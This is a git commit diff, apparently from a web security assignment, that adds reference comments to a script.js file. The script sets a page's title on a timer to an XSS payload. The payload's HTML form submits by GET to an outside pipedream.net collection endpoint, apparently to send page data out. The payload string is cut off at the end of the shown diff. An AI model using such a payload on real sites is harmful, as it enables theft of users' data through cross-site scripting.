ddcf680ea0bf94f38478634c48ccb99366236c43
AngelaGu <angela.gu1224@gmail.com>
2023-03-08 19:46:30 -0800

    adds references

--- script.js
+++ script.js
@@ -1,4 +1,12 @@
+// references:
+// [41] https://requestbin.com/ --> request bin 
+// [43] https://www.w3schools.com/jsref/met_win_setinterval.asp --> setInterval() usage 
+// [46] https://developer.mozilla.org/en-US/docs/Web/API/Document/forms --> for making forms and accessing their values
+// [32] https://www.w3schools.com/jsref/prop_node_textcontent.asp --> textContent usage
+// [47] https://developer.mozilla.org/en-US/docs/Web/API/Document/documentElement --> to get entire document element
+// [48] https://www.w3schools.com/jsref/event_onerror.asp --> onerror event usage 
 function changeTitle(){
+    // in 100 ms, change the page title to be the XSS payload 
     window.setInterval(function(){
         document.title = 
             '<form name="xss_form" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
